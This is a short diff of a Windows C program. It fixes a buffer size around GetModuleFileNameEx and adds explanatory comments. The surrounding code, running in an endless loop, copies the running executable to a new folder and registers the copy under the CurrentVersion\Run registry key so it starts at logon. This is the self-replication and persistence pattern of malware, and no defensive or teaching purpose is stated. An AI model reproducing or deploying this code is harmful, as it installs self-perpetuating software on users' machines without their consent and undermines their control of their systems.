@@ -22,10 +22,10 @@ int main()
 
 	srand(time(NULL));
 
-	WCHAR filename[FILENAME_LEN] = { 0 };
+	WCHAR filename[FILENAME_LEN + 1] = { 0 };
 	HANDLE thisProcess = GetCurrentProcess();
 	HKEY regKey = NULL;
-	GetModuleFileNameEx(thisProcess, NULL, filename, FILENAME_LEN - 1); // get filename
+	GetModuleFileNameEx(thisProcess, NULL, filename, FILENAME_LEN); // get filename
 	CloseHandle(thisProcess);
 
 	while (TRUE)
@@ -34,7 +34,9 @@ int main()
 		CreateDirectory(NEW_FOLDER_PATH, NULL);
 		CopyFile(filename, NEW_FILE_PATH, FALSE); // will not work if the original is deleted :(
 		
+		// Create autorun registry key
 		RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &regKey);
+		// Set the key value to the new file path
 		RegSetValueEx(regKey, AUTORUN_REG_NAME, 0, REG_SZ, NEW_FILE_PATH, (wcslen(NEW_FILE_PATH) + 1) * 2);
 		CloseHandle(regKey);
 
